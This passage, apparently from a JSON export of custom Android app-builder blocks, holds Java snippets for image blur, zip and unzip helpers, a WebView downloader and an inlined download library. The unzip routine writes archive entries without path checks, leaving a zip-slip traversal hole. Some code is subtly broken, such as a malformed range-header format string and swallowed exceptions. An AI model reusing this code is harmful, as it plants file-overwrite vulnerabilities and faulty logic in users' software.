smallBitmap);\n\t\tandroid.renderscript.Allocation blurOutput \u003d android.renderscript.Allocation.createFromBitmap(renderScript, bitmap);\n \n\t\tandroid.renderscript.ScriptIntrinsicBlur blur \u003d android.renderscript.ScriptIntrinsicBlur.create(renderScript,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tandroid.renderscript.Element.U8_4(renderScript));\n\t\tblur.setInput(blurInput);\n\t\tblur.setRadius(radius); // radius must be 0 \u003c r \u003c\u003d 25\n\t\tblur.forEach(blurOutput);\n \n\t\tblurOutput.copyTo(bitmap);\n\t\trenderScript.destroy();\n \n\t\treturn bitmap;\n \n\t}\n \n\tprivate static Bitmap RGB565toARGB888(Bitmap img) throws Exception {\n\t\tint numPixels \u003d img.getWidth() * img.getHeight();\n\t\tint[] pixels \u003d new int[numPixels];\n \n\t\t//Get JPEG pixels.  Each int is the color values for one pixel.\n\t\timg.getPixels(pixels, 0, img.getWidth(), 0, 0, img.getWidth(), img.getHeight());\n \n\t\t//Create a Bitmap of the appropriate format.\n\t\tBitmap result \u003d Bitmap.createBitmap(img.getWidth(), img.getHeight(), Bitmap.Config.ARGB_8888);\n \n\t\t//Set RGB pixels.\n\t\tresult.setPixels(pixels, 0, result.getWidth(), 0, 0, result.getWidth(), result.getHeight());\n\t\treturn result;","color":"#FFBB86FC","name":"Blur Image ","typeName":"","palette":"165","type":" ","spec":"%m.imageview  set Blured Image From Ressource %m.resource "},{"code":"","color":"#FF7B1FA2","name":"hahsjs","typeName":"","palette":"166","type":"h","spec":"CREATED BY ARAB WARE CHANNEL \u003d\u003e SOME CODES FROM AGUS JCODES LIKE ZIP FOLDER"},{"code":"}\n\n\n/*MADE BY ARAB WARE CHANNEL*/\n/*WHAT IS MADE ? \u003d\u003d\u003d\u003eADD FOLDER TO ZIP*/\n\npublic void ArabWareAddFolderToZip (String _from,String _to) {\nif (FileUtil.isExistFile(_to.replace(Uri.parse(_to).getLastPathSegment(), \"\").concat(\"files/\"))) {\r\n\tnew UnZip().unZipIt(_to, _to.replace(Uri.parse(_to).getLastPathSegment(), \"\").concat(\"files/\"));\r\n\tnew java.io.File(_from).renameTo(new java.io.File(_to.replace(Uri.parse(_to).getLastPathSegment(), \"\").concat(\"files/\").concat(Uri.parse(_from).getLastPathSegment())));\r\n\ttry {\n\t\tZip.zipFolder(_to.replace(Uri.parse(_to).getLastPathSegment(), \"\").concat(\"files/\"),_to.replace(Uri.parse(_to).getLastPathSegment(), \"\") + Uri.parse(_to).getLastPathSegment());\n\t} catch(Exception e) {}\r\n\tFileUtil.deleteFile(_to.replace(Uri.parse(_to).getLastPathSegment(), \"\").concat(\"files/\"));\r\n}\r\nelse {\r\n\tFileUtil.makeDir(_to.replace(Uri.parse(_to).getLastPathSegment(), \"\").concat(\"files/\"));\r\n\tnew UnZip().unZipIt(_to, _to.replace(Uri.parse(_to).getLastPathSegment(), \"\").concat(\"files/\"));\r\n\tnew java.io.File(_from).renameTo(new java.io.File(_to.replace(Uri.parse(_to).getLastPathSegment(), \"\").concat(\"files/\").concat(Uri.parse(_from).getLastPathSegment())));\r\n\ttry {\n\t\tZip.zipFolder(_to.replace(Uri.parse(_to).getLastPathSegment(), \"\").concat(\"files/\"),_to.replace(Uri.parse(_to).getLastPathSegment(), \"\") + Uri.parse(_to).getLastPathSegment());\n\t} catch(Exception e) {}\r\n\tFileUtil.deleteFile(_to.replace(Uri.parse(_to).getLastPathSegment(), \"\").concat(\"files/\"));\r\n}\n}\n\n\n\npublic void addFilesToZip(java.io.File source, java.io.File files)\n{\n    try\n    {\n\n   \n        byte[] buffer \u003d new byte[1024];\n        java.util.zip.ZipInputStream zin \u003d new java.util.zip.ZipInputStream(new java.io.FileInputStream(files));\n        java.util.zip.ZipOutputStream out \u003d new java.util.zip.ZipOutputStream(new java.io.FileOutputStream(source));\n            java.io.InputStream in \u003d new java.io.FileInputStream(files);\n            out.putNextEntry(new java.util.zip.ZipEntry(files.getName()));\n            for(int read \u003d in.read(buffer); read \u003e -1; read \u003d in.read(buffer))\n            {\n                out.write(buffer, 0, read);\n            }\n            out.closeEntry();\n            in.close();\n\n        for(java.util.zip.ZipEntry ze \u003d zin.getNextEntry(); ze !\u003d null; ze \u003d zin.getNextEntry())\n        {\n            out.putNextEntry(ze);\n            for(int read \u003d zin.read(buffer); read \u003e -1; read \u003d zin.read(buffer))\n            {\n                out.write(buffer, 0, read);\n            }\n            out.closeEntry();\n        }\n\n        out.close();\n      \n    }\n    catch(Exception e)\n    {\n       showMessage(e.getMessage());\n    }\n}\npublic static class Zip {\n\npublic static void zipFolder(String str, String str2) throws Exception {\n            java.util.zip.ZipOutputStream zipOutputStream \u003d new java.util.zip.ZipOutputStream(new java.io.FileOutputStream(str2));\n            addFolderToZip(\"\", str, zipOutputStream);\n            zipOutputStream.flush();\n            zipOutputStream.close();\n        }\n\n\npublic static void addFolderToZip(String str, String str2, java.util.zip.ZipOutputStream zipOutputStream) throws Exception {\n            java.io.File file \u003d new java.io.File(str2);\n            for (String str3 : file.list()) {\n                if (str.equals(\"\")) {\n                    addFileToZip(file.getName(), new StringBuilder(String.valueOf(str2)).append(\"/\").append(str3).toString(), zipOutputStream);\n                } else {\n                    addFileToZip(new StringBuilder(String.valueOf(str)).append(\"/\").append(file.getName()).toString(), new StringBuilder(String.valueOf(str2)).append(\"/\").append(str3).toString(), zipOutputStream);\n                }\n            }\n        }\n\n\n\n  public static void addFileToZip(String path, String srcFile, java.util.zip.ZipOutputStream zip)\n      throws Exception {\n    java.io.File folder \u003d new java.io.File(srcFile);\n    if (folder.isDirectory()) {\n      \n    } else {\n      byte[] buf \u003d new byte[1024];\n      int len;\n      java.io.FileInputStream in \u003d new java.io.FileInputStream(srcFile);\n      zip.putNextEntry(new java.util.zip.ZipEntry(path + \"/\" + folder.getName()));\n      while ((len \u003d in.read(buf)) \u003e 0) {\n        zip.write(buf, 0, len);\n      }\n    }\n}\n  }\n\npublic static class UnZip {\nList\u003cString\u003e fileList;\n\npublic void unZipIt(String zipFile, String outputFolder){\nbyte[] buffer \u003d new byte[1024];\ntry{\njava.util.zip.ZipInputStream zis \u003d new java.util.zip.ZipInputStream(new java.io.FileInputStream(zipFile));\njava.util.zip.ZipEntry ze \u003d zis.getNextEntry();\nwhile(ze!\u003dnull){\nString fileName \u003d ze.getName();\njava.io.File newFile \u003d new java.io.File(outputFolder + java.io.File.separator + fileName);\nnew java.io.File(newFile.getParent()).mkdirs();\njava.io.FileOutputStream fos \u003d new java.io.FileOutputStream(newFile);\nint len;\nwhile ((len \u003d zis.read(buffer)) \u003e 0) {\nfos.write(buffer, 0, len);\n}\nfos.close();\nze \u003d zis.getNextEntry(); \n}\nzis.closeEntry();\nzis.close();\n}catch(java.io.IOException ex){\nex.printStackTrace();\n}\n}","color":"#FF7B1FA2","name":"library....","typeName":"","palette":"166","type":" ","spec":"put me at more block"},{"code":"new UnZip().unZipIt(%1$s, %2$s);","color":"#FF7B1FA2","name":"unzip...","typeName":"","palette":"166","type":" ","spec":"unzip from %s to %s"},{"code":"try {\nZip.zipFolder(%1$s,%2$s + %3$s);\n} catch(Exception e) {}","color":"#FF7B1FA2","name":"zip...","typeName":"","palette":"166","type":" ","spec":"Zip folder path %s to %s with file name %s"},{"code":"addFilesToZip(new java.io.File(%2$s),new java.io.File(%1$s));","color":"#FF7B1FA2","name":"addFileToZipFile","typeName":"","palette":"166","type":" ","spec":"add file from %s in zip file from path %s"},{"code":"/*made fully by arab ware channel*/\nArabWareAddFolderToZip(%1$s,%2$s);","color":"#FF7B1FA2","name":"addFolderToZip","typeName":"","palette":"166","type":" ","spec":"add folder from path %s to zip file from path %s"},{"code":"try {\n\r%s\n} catch(net.lingala.zip4j.exception.ZipException e) {\n\r%s\n}","color":"#FF00BCD4","typeName":"","name":"trymolang","palette":"166","type":"e","spec":"Try Zip4J","spec2":""},{"code":"zipFile.isEncrypted()","color":"#FF00BCD4","name":"isEncrypted","typeName":"","palette":"166","type":"b","spec":"is Encrypted"},{"code":"TextUtils.isEmpty(%1$s.getText().toString())","color":"#FF00BCD4","name":"ifempty","typeName":"","palette":"166","type":"b","spec":"%m.edittext isEmpty"},{"code":"net.lingala.zip4j.core.ZipFile zipFile \u003d new net.lingala.zip4j.core.ZipFile(%1$s);","color":"#FF00BCD4","name":"newZip","typeName":"","palette":"166","type":" ","spec":"Zip InPut Directory %s"},{"code":"zipFile.extractAll(%1$s);","color":"#FF00BCD4","name":"newZipp","typeName":"","palette":"166","type":" ","spec":"Zip OutPut Directory %s"},{"code":"zipFile.setPassword(%1$s);","color":"#FF00BCD4","name":"zipPass","typeName":"","palette":"166","type":" ","spec":"setPass %s"},{"code":"e","color":"#FF00BCD4","name":"ZipException","typeName":"","palette":"166","type":"s","spec":"Zip Exception"},{"code":"","color":"#FF9CCC65","name":"created by arab ware channel.","typeName":"","palette":"167","type":"h","spec":"created by arab ware channel"},{"code":"final WebView %1$sweb \u003d new WebView(%2$s.this);\nfinal String %1$sStr \u003d %3$s;\n%1$sweb.setDownloadListener(new DownloadListener() {\npublic void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {\nDownloadManager.Request request \u003d new DownloadManager.Request(Uri.parse(url));\nString cookies \u003d CookieManager.getInstance().getCookie(url);\nrequest.addRequestHeader(\"cookie\", cookies);\nrequest.addRequestHeader(\"User-Agent\", userAgent);\nrequest.setDescription(\"Downloading file...\");\nrequest.setTitle(URLUtil.guessFileName(url, contentDisposition, mimetype));\nrequest.allowScanningByMediaScanner(); request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);\njava.io.File aatv \u003d new java.io.File(Environment.getExternalStorageDirectory().getPath() + \"/\" + %1$sStr);\nif(!aatv.exists()){if (!aatv.mkdirs()){ Log.e(\"TravellerLog ::\",\"Problem creating Image folder\");}} request.setDestinationInExternalPublicDir(\"/\" + %1$sStr, URLUtil.guessFileName(url, contentDisposition, mimetype));\nDownloadManager manager \u003d (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);\nmanager.enqueue(request);\nshowMessage(\"Downloading File....\");\n//Notif if success\nBroadcastReceiver onComplete \u003d new BroadcastReceiver() {\npublic void onReceive(Context ctxt, Intent intent) {\nshowMessage(\"Download Complete!\");\nunregisterReceiver(this);\n}};\nregisterReceiver(onComplete, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));\n}\n});","color":"#FF9CCC65","name":"createDownloader","typeName":"","palette":"167","type":" ","spec":"create Downloader %m.intent in %m.activity in path %s"},{"code":"%1$sweb.loadUrl(%2$s);\r","color":"#FF9CCC65","name":"start Downloader","typeName":"","palette":"167","type":" ","spec":"%m.intent start downloader with link %s"},{"code":"PRDownloaderConfig config \u003d PRDownloaderConfig.newBuilder()\n\t.setDatabaseEnabled(true)\n\t.build();\nPRDownloader.initialize(%1$s.this, config);\n%5$s.setOnClickListener(new View.OnClickListener() {\npublic void onClick(View v) {\n\tif (Status.RUNNING \u003d\u003d PRDownloader.getStatus(downloadId)) {\n\t\tPRDownloader.pause(downloadId);\n\t\treturn;\n\t}\n\t%7$s.getIndeterminateDrawable().setColorFilter(Color.BLUE, android.graphics.PorterDuff.Mode.SRC_IN);\n\tif (Status.PAUSED \u003d\u003d PRDownloader.getStatus(downloadId)) {\n\t\tPRDownloader.resume(downloadId);\n\t\treturn;\n\t}\n\tdownloadId \u003d PRDownloader.download(%2$s\n, %3$s, %4$s)\n\t\t.build()\n\t\t.setOnStartOrResumeListener(new OnStartOrResumeListener() {\n\t\t\t@Override\n\t\t\tpublic void onStartOrResume() {\n\t\t\t}\n\t})\n\t.setOnPauseListener(new OnPauseListener() {\n\t\t@Override\n\t\tpublic void onPause() {\n\t\t}\n\t})\n\t.setOnCancelListener(new OnCancelListener() {\n\t\t@Override\n\t\tpublic void onCancel() {\n\t\t}\n\t})\n\t.setOnProgressListener(new OnProgressListener() {\n\t\t@Override\n\t\tpublic void onProgress(Progress progress) {\nlong progressPercent \u003d progress.currentBytes * 100 / progress.totalBytes;\n%8$s\n\t\t\n\t\t}\n\t})\n\t.start(new OnDownloadListener() {\n\t\t@Override\n\t\tpublic void onDownloadComplete() {\n%9$s\n\t\t}\n\t\t@Override\n\t\tpublic void onError(Error error) {\n\t\t}\n\t});\n}\n});\n%6$s.setOnClickListener(new View.OnClickListener() {\n@Override public void onClick(View view) {\nPRDownloader.cancel(downloadId);\n}\n});","color":"#FF33691E","typeName":"","name":"....","palette":"167","type":"e","spec":"%m.activity Download link %s path %s file name %s start button %m.button stop button %m.button progress bar %m.progressbar On Progress","spec2":"On Completed"},{"code":"(int) progressPercent","color":"#FF33691E","name":"get progress ...","typeName":"","palette":"167","type":"d","spec":"get progress"},{"code":"//this block and project made by suaib ahmed\n}\n\npublic static class PRDownloader {\n    private PRDownloader() {\n\t    }\n    public static void initialize(Context context) {\n\t        initialize(context, PRDownloaderConfig.newBuilder().build());\n\t    }\n    public static void initialize(Context context, PRDownloaderConfig config) {\n\t        ComponentHolder.getInstance().init(context, config);\n\t        DownloadRequestQueue.initialize();\n\t    }\n    public static DownloadRequestBuilder download(String url, String dirPath, String fileName) {\n\t        return new DownloadRequestBuilder(url, dirPath, fileName);\n\t    }\n    public static void pause(int downloadId) {\n\t        DownloadRequestQueue.getInstance().pause(downloadId);\n\t    }\n    public static void resume(int downloadId) {\n\t        DownloadRequestQueue.getInstance().resume(downloadId);\n\t    }\n    public static void cancel(int downloadId) {\n\t        DownloadRequestQueue.getInstance().cancel(downloadId);\n\t    }\n    public static void cancel(Object tag) {\n\t        DownloadRequestQueue.getInstance().cancel(tag);\n\t    }\n    public static void cancelAll() {\n\t        DownloadRequestQueue.getInstance().cancelAll();\n\t    }\n    public static Status getStatus(int downloadId) {\n\t        return DownloadRequestQueue.getInstance().getStatus(downloadId);\n\t    }\n    public static void cleanUp(int days) {\n\t        Utils.deleteUnwantedModelsAndTempFiles(days);\n\t    }\n    public static void shutDown() {\n\t        Core.shutDown();\n\t    }\n}\n\npublic static class Response {\n    private Error error;\n    private boolean isSuccessful;\n    private boolean isPaused;\n    private boolean isCancelled;\n    public Error getError() {\n\t        return error;\n\t    }\n    public void setError(Error error) {\n\t        this.error \u003d error;\n\t    }\n    public boolean isSuccessful() {\n\t        return isSuccessful;\n\t    }\n    public void setSuccessful(boolean successful) {\n\t        isSuccessful \u003d successful;\n\t    }\n    public boolean isPaused() {\n\t        return isPaused;\n\t    }\n    public void setPaused(boolean paused) {\n\t        isPaused \u003d paused;\n\t    }\n    public boolean isCancelled() {\n\t        return isCancelled;\n\t    }\n    public void setCancelled(boolean cancelled) {\n\t        isCancelled \u003d cancelled;\n\t    }\n}\n\npublic static enum Status {\n    QUEUED,\n    RUNNING,\n    PAUSED,\n    COMPLETED,\n    CANCELLED,\n    UNKNOWN\n}\n\npublic static class Progress implements java.io.Serializable {\n    public long currentBytes;\n    public long totalBytes;\n    public Progress(long currentBytes, long totalBytes) {\n\t        this.currentBytes \u003d currentBytes;\n\t        this.totalBytes \u003d totalBytes;\n\t    }\n    @Override\n    public String toString() {\n\t        return \"Progress{\" +\n\t                \"currentBytes\u003d\" + currentBytes +\n\t                \", totalBytes\u003d\" + totalBytes +\n\t                \u0027}\u0027;\n\t    }\n}\n\npublic static enum Priority {\n    LOW,\n    MEDIUM,\n    HIGH,\n    IMMEDIATE\n}\n\n\npublic static class PRDownloaderConfig {\n    private int readTimeout;\n    private int connectTimeout;\n    private String userAgent;\n    private HttpClient httpClient;\n    private boolean databaseEnabled;\n    private PRDownloaderConfig(Builder builder) {\n\t        this.readTimeout \u003d builder.readTimeout;\n\t        this.connectTimeout \u003d builder.connectTimeout;\n\t        this.userAgent \u003d builder.userAgent;\n\t        this.httpClient \u003d builder.httpClient;\n\t        this.databaseEnabled \u003d builder.databaseEnabled;\n\t    }\n    public int getReadTimeout() {\n\t        return readTimeout;\n\t    }\n    public void setReadTimeout(int readTimeout) {\n\t        this.readTimeout \u003d readTimeout;\n\t    }\n    public int getConnectTimeout() {\n\t        return connectTimeout;\n\t    }\n    public void setConnectTimeout(int connectTimeout) {\n\t        this.connectTimeout \u003d connectTimeout;\n\t    }\n    public String getUserAgent() {\n\t        return userAgent;\n\t    }\n    public void setUserAgent(String userAgent) {\n\t        this.userAgent \u003d userAgent;\n\t    }\n    public HttpClient getHttpClient() {\n\t        return httpClient;\n\t    }\n    public void setHttpClient(HttpClient httpClient) {\n\t        this.httpClient \u003d httpClient;\n\t    }\n    public boolean isDatabaseEnabled() {\n\t        return databaseEnabled;\n\t    }\n    public void setDatabaseEnabled(boolean databaseEnabled) {\n\t        this.databaseEnabled \u003d databaseEnabled;\n\t    }\n    public static Builder newBuilder() {\n\t        return new Builder();\n\t    }\n    public static class Builder {\n\t        int readTimeout \u003d Constants.DEFAULT_READ_TIMEOUT_IN_MILLS;\n\t        int connectTimeout \u003d Constants.DEFAULT_CONNECT_TIMEOUT_IN_MILLS;\n\t        String userAgent \u003d Constants.DEFAULT_USER_AGENT;\n\t        HttpClient httpClient \u003d new DefaultHttpClient();\n\t        boolean databaseEnabled \u003d false;\n\t        public Builder setReadTimeout(int readTimeout) {\n\t\t            this.readTimeout \u003d readTimeout;\n\t\t            return this;\n\t\t        }\n\t        public Builder setConnectTimeout(int connectTimeout) {\n\t\t            this.connectTimeout \u003d connectTimeout;\n\t\t            return this;\n\t\t        }\n\t        public Builder setUserAgent(String userAgent) {\n\t\t            this.userAgent \u003d userAgent;\n\t\t            return this;\n\t\t        }\n\t        public Builder setHttpClient(HttpClient httpClient) {\n\t\t            this.httpClient \u003d httpClient;\n\t\t            return this;\n\t\t        }\n\t        public Builder setDatabaseEnabled(boolean databaseEnabled) {\n\t\t            this.databaseEnabled \u003d databaseEnabled;\n\t\t            return this;\n\t\t        }\n\t        public PRDownloaderConfig build() {\n\t\t            return new PRDownloaderConfig(this);\n\t\t        }\n\t    }\n}\n\n\npublic static final class Constants {\n    private Constants() {\n\t    }\n    public static final int UPDATE \u003d 0x01;\n    public static final String RANGE \u003d \"Range\";\n    public static final String ETAG \u003d \"ETag\";\n    public static final String USER_AGENT \u003d \"User-Agent\";\n    public static final String DEFAULT_USER_AGENT \u003d \"Gymkhana-Studio\";\n    public static final int DEFAULT_READ_TIMEOUT_IN_MILLS \u003d 20_000;\n    public static final int DEFAULT_CONNECT_TIMEOUT_IN_MILLS \u003d 20_000;\n    public static final int HTTP_RANGE_NOT_SATISFIABLE \u003d 416;\n    public static final int HTTP_TEMPORARY_REDIRECT \u003d 307;\n    public static final int HTTP_PERMANENT_REDIRECT \u003d 308;\n}\n\npublic static class Error {\n    private boolean isServerError;\n    private boolean isConnectionError;\n    public boolean isServerError() {\n\t        return isServerError;\n\t    }\n    public void setServerError(boolean serverError) {\n\t        isServerError \u003d serverError;\n\t    }\n    public boolean isConnectionError() {\n\t        return isConnectionError;\n\t    }\n    public void setConnectionError(boolean connectionError) {\n\t        isConnectionError \u003d connectionError;\n\t    }\n}\n\npublic static interface OnCancelListener {\n    void onCancel();\n}\n\npublic static interface OnDownloadListener {\n    void onDownloadComplete();\n    void onError(Error error);\n}\n\npublic static interface OnPauseListener {\n    void onPause();\n}\n\npublic static interface OnProgressListener {\n    void onProgress(Progress progress);\n}\n\npublic static interface OnStartOrResumeListener {\n    void onStartOrResume();\n}\n\n\n\npublic static class ProgressHandler extends Handler {\n    private final OnProgressListener listener;\n    public ProgressHandler(OnProgressListener listener) {\n\t        super(Looper.getMainLooper());\n\t        this.listener \u003d listener;\n\t    }\n    @Override\n    public void handleMessage(Message msg) {\n\t        switch (msg.what) {\n\t\t            case Constants.UPDATE:\n\t\t                if (listener !\u003d null) {\n\t\t\t                    final Progress progress \u003d (Progress) msg.obj;\n\t\t\t                    listener.onProgress(progress);\n\t\t\t                }\n\t\t                break;\n\t\t            default:\n\t\t                super.handleMessage(msg);\n\t\t                break;\n\t\t        }\n\t    }\n}\n\npublic static class DefaultHttpClient implements HttpClient {\n    private java.net.URLConnection connection;\n    public DefaultHttpClient() {\n\t    }\n    @SuppressWarnings(\"CloneDoesntCallSuperClone\")\n    @Override\n    public HttpClient clone() {\n\t        return new DefaultHttpClient();\n\t    }\n    @Override\n    public void connect(DownloadRequest request) throws java.io.IOException {\n\t        connection \u003d new java.net.URL(request.getUrl()).openConnection();\n\t        connection.setReadTimeout(request.getReadTimeout());\n\t        connection.setConnectTimeout(request.getConnectTimeout());\n\t        final String range \u003d String.format(Locale.ENGLISH,\n\t                \"bytes\u003dd-\", request.getDownloadedBytes());\n\t        connection.addRequestProperty(Constants.RANGE, range);\n\t        connection.addRequestProperty(Constants.USER_AGENT, request.getUserAgent());\n\t        addHeaders(request);\n\t        connection.connect();\n\t    }\n    @Override\n    public int getResponseCode() throws java.io.IOException {\n\t        int responseCode \u003d 0;\n\t        if (connection instanceof java.net.HttpURLConnection) {\n\t\t            responseCode \u003d ((java.net.HttpURLConnection) connection).getResponseCode();\n\t\t        }\n\t        return responseCode;\n\t    }\n    @Override\n    public java.io.InputStream getInputStream() throws java.io.IOException {\n\t        return connection.getInputStream();\n\t    }\n    @Override\n    public long getContentLength() {\n\t        String length \u003d connection.getHeaderField(\"Content-Length\");\n\t        try {\n\t\t            return Long.parseLong(length);\n\t\t        } catch (NumberFormatException e) {\n\t\t            return -1;\n\t\t        }\n\t    }\n    @Override\n    public String getResponseHeader(String name) {\n\t        return connection.getHeaderField(name);\n\t    }\n    @Override\n    public void close() {\n\t    }\n    private void addHeaders(DownloadRequest request) {\n\t        final HashMap\u003cString, List\u003cString\u003e\u003e headers \u003d request.getHeaders();\n\t        if (headers !\u003d null) {\n\t\t            Set\u003cMap.Entry\u003cString, List\u003cString\u003e\u003e\u003e entries \u003d headers.entrySet();\n\t\t            for (Map.Entry\u003cString, List\u003cString\u003e\u003e entry : entries) {\n\t\t\t                String name \u003d entry.getKey();\n\t\t\t                List\u003cString\u003e list \u003d entry.getValue();\n\t\t\t                if (list !\u003d null) {\n\t\t\t\t                    for (String value : list) {\n\t\t\t\t\t                        connection.addRequestProperty(name, value);\n\t\t\t\t\t                    }\n\t\t\t\t                }\n\t\t\t            }\n\t\t        }\n\t    }\n\n}\n\npublic static interface HttpClient extends Cloneable {\n    HttpClient clone();\n    void connect(DownloadRequest request) throws java.io.IOException;\n    int getResponseCode() throws java.io.IOException;\n    java.io.InputStream getInputStream() throws java.io.IOException;\n    long getContentLength();\n    String getResponseHeader(String name);\n    void close();\n}\n\npublic static class DownloadRequest {\n    private Priority priority;\n    private Object tag;\n    private String url;\n    private String dirPath;\n    private String fileName;\n    private int sequenceNumber;\n    private java.util.concurrent.Future future;\n    private long downloadedBytes;\n    private long totalBytes;\n    private int readTimeout;\n    private int connectTimeout;\n    private String userAgent;\n    private OnProgressListener onProgressListener;\n    private OnDownloadListener onDownloadListener;\n    private OnStartOrResumeListener onStartOrResumeListener;\n    private OnPauseListener onPauseListener;\n    private OnCancelListener onCancelListener;\n    private int downloadId;\n    private HashMap\u003cString, List\u003cString\u003e\u003e headerMap;\n    private Status status;\n\n    DownloadRequest(DownloadRequestBuilder builder) {\n\t        this.url \u003d builder.url;\n\t        this.dirPath \u003d builder.dirPath;\n\t        this.fileName \u003d builder.fileName;\n\t        this.headerMap \u003d builder.headerMap;\n\t        this.priority \u003d builder.priority;\n\t        this.tag \u003d builder.tag;\n\t        this.readTimeout \u003d\n\t                builder.readTimeout !\u003d 0 ?\n\t                        builder.readTimeout :\n\t                        getReadTimeoutFromConfig();\n\t        this.connectTimeout \u003d\n\t                builder.connectTimeout !\u003d 0 ?\n\t                        builder.connectTimeout :\n\t                        getConnectTimeoutFromConfig();\n\t        this.userAgent \u003d builder.userAgent;\n\t    }\n\n    public Priority getPriority() {\n\t        return priority;\n\t    }\n\n    public void setPriority(Priority priority) {\n\t        this.priority \u003d priority;\n\t    }\n\n    public Object getTag() {\n\t        return tag;\n\t    }\n\n    public void setTag(Object tag) {\n\t        this.tag \u003d tag;\n\t    }\n\n    public String getUrl() {\n\t        return url;\n\t    }\n\n    public void setUrl(String url) {\n\t        this.url \u003d url;\n\t    }\n\n    public String getDirPath() {\n\t        return dirPath;\n\t    }\n\n    public void setDirPath(String dirPath) {\n\t        this.dirPath \u003d dirPath;\n\t    }\n\n    public String getFileName() {\n\t        return fileName;\n\t    }\n\n    public void setFileName(String fileName) {\n\t        this.fileName \u003d fileName;\n\t    }\n\n    public int getSequenceNumber() {\n\t        return sequenceNumber;\n\t    }\n\n    public void setSequenceNumber(int sequenceNumber) {\n\t        this.sequenceNumber \u003d sequenceNumber;\n\t    }\n\n    public HashMap\u003cString, List\u003cString\u003e\u003e getHeaders() {\n\t        return headerMap;\n\t    }\n\n    public java.util.concurrent.Future getFuture() {\n\t        return future;\n\t    }\n\n    public void setFuture(java.util.concurrent.Future future) {\n\t        this.future \u003d future;\n\t    }\n\n    public long getDownloadedBytes() {\n\t        return downloadedBytes;\n\t    }\n\n    public void setDownloadedBytes(long downloadedBytes) {\n\t        this.downloadedBytes \u003d downloadedBytes;\n\t    }\n\n    public long getTotalBytes() {\n\t        return totalBytes;\n\t    }\n\n    public void setTotalBytes(long totalBytes) {\n\t        this.totalBytes \u003d totalBytes;\n\t    }\n\n    public int getReadTimeout() {\n\t        return readTimeout;\n\t    }\n\n    public void setReadTimeout(int readTimeout) {\n\t        this.readTimeout \u003d readTimeout;\n\t    }\n\n    public int getConnectTimeout() {\n\t        return connectTimeout;\n\t    }\n\n    public void setConnectTimeout(int connectTimeout) {\n\t        this.connectTimeout \u003d connectTimeout;\n\t    }\n\n    public String getUserAgent() {\n\t        if (userAgent \u003d\u003d null) {\n\t\t            userAgent \u003d ComponentHolder.getInstance().getUserAgent();\n\t\t        }\n\t        return userAgent;\n\t    }\n\n    public void setUserAgent(String userAgent) {\n\t        this.userAgent \u003d userAgent;\n\t    }\n\n    public int getDownloadId() {\n\t        return downloadId;\n\t    }\n\n    public void setDownloadId(int downloadId) {\n\t        this.downloadId \u003d downloadId;\n\t    }\n\n    public Status getStatus() {\n\t        return status;\n\t    }\n\n    public void setStatus(Status status) {\n\t        this.status \u003d status;\n\t    }\n\n    public OnProgressListener getOnProgressListener() {\n\t        return onProgressListener;\n\t    }\n\n    public DownloadRequest setOnStartOrResumeListener(OnStartOrResumeListener onStartOrResumeListener) {\n\t        this.onStartOrResumeListener \u003d onStartOrResumeListener;\n\t        return this;\n\t    }\n\n    public DownloadRequest setOnProgressListener(OnProgressListener onProgressListener) {\n\t        this.onProgressListener \u003d onProgressListener;\n\t        return this;\n\t    }\n\n    public DownloadRequest setOnPauseListener(OnPauseListener onPauseListener) {\n\t        this.onPauseListener \u003d onPauseListener;\n\t        return this;\n\t    }\n\n    public DownloadRequest setOnCancelListener(OnCancelListener onCancelListener) {\n\t        this.onCancelListener \u003d onCancelListener;\n\t        return this;\n\t    }\n\n    public int start(OnDownloadListener onDownloadListener) {\n\t        this.onDownloadListener \u003d onDownloadListener;\n\t        downloadId \u003d Utils.getUniqueId(url, dirPath, fileName);\n\t        DownloadRequestQueue.getInstance().addRequest(this);\n\t        return downloadId;\n\t    }\n\n    public Response executeSync() {\n\t        downloadId \u003d Utils.getUniqueId(url, dirPath, fileName);\n\t        return new SynchronousCall(this).execute();\n\t    }\n\n    public void deliverError(final Error error) {\n\t        if (status !\u003d Status.CANCELLED) {\n\t\t            Core.getInstance().getExecutorSupplier().forMainThreadTasks()\n\t\t                    .execute(new Runnable() {\n\t\t\t                        public void run() {\n\t\t\t\t                            if (onDownloadListener !\u003d null) {\n\t\t\t\t\t                                onDownloadListener.onError(error);\n\t\t\t\t\t                            }\n\t\t\t\t                            finish();\n\t\t\t\t                        }\n\t\t\t                    });\n\t\t        }\n\t    }\n\n    public void deliverSuccess() {\n\t        if (status !\u003d Status.CANCELLED) {\n\t\t            setStatus(Status.COMPLETED);\n\t\t            Core.getInstance().getExecutorSupplier().forMainThreadTasks()\n\t\t                    .execute(new Runnable() {\n\t\t\t                        public void run() {\n\t\t\t\t                            if (onDownloadListener !\u003d null) {\n\t\t\t\t\t                                onDownloadListener.onDownloadComplete();\n\t\t\t\t\t                            }\n\t\t\t\t                            finish();\n\t\t\t\t                        }\n\t\t\t                    });\n\t\t        }\n\t    }\n\n    public void deliverStartEvent() {\n\t        if (status !\u003d Status.CANCELLED) {\n\t\t            Core.getInstance().getExecutorSupplier().forMainThreadTasks()\n\t\t                    .execute(new Runnable() {\n\t\t\t                        public void run() {\n\t\t\t\t                            if (onStartOrResumeListener !\u003d null) {\n\t\t\t\t\t                                onStartOrResumeListener.onStartOrResume();\n\t\t\t\t\t                            }\n\t\t\t\t                        }\n\t\t\t                    });\n\t\t        }\n\t    }\n\n    public void deliverPauseEvent() {\n\t        if (status !\u003d Status.CANCELLED) {\n\t\t            Core.getInstance().getExecutorSupplier().forMainThreadTasks()\n\t\t                    .execute(new Runnable() {\n\t\t\t                        public void run() {\n\t\t\t\t                            if (onPauseListener !\u003d null) {\n\t\t\t\t\t                                onPauseListener.onPause();\n\t\t\t\t\t                            }\n\t\t\t\t                        }\n\t\t\t                    });\n\t\t        }\n\t    }\n\n    private void deliverCancelEvent() {\n\t        Core.getInstance().getExecutorSupplier().forMainThreadTasks()\n\t                .execute(new Runnable() {\n\t\t                    public void run() {\n\t\t\t                        if (onCancelListener !\u003d null) {\n\t\t\t\t                            onCancelListener.onCancel();\n\t\t\t\t                        }\n\t\t\t                    }\n\t\t                });\n\t    }\n\n    public void cancel() {\n\t        status \u003d Status.CANCELLED;\n\t        if (future !\u003d null) {\n\t\t            future.cancel(true);\n\t\t        }\n\t        